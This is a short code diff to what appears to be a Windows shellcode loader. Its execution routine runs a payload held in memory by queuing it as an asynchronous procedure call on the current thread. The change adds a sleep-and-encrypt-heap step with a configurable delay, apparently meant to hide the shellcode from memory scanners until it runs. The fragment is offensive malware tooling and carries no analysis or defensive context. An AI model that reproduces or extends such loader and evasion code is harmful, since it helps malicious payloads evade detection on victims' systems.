@@ -1,6 +1,7 @@
 #include "../../../includes/memory/memory.h"
 #include "../../../includes/apis/apis.h"
 #include "../../../includes/core/core.h"
+#include "../../../includes/utils/utils.h"
 
 
 
@@ -13,7 +14,7 @@ BOOL execution_load_apis() {
 
 BOOL execution_run(MemoryInfo memInfo) {
 	HANDLE hThread = GetCurrentThread();
-
+	ldr_sleep_encrypt_heap(g_ldr->config->DelayBefore, memInfo.ShellCodeAddress, memInfo.BytesWrote);
 	if (!g_ldr->apis->QueueUserAPC((PAPCFUNC)memInfo.ShellCodeAddress, hThread, NULL)) {
 		return FALSE;
 	}
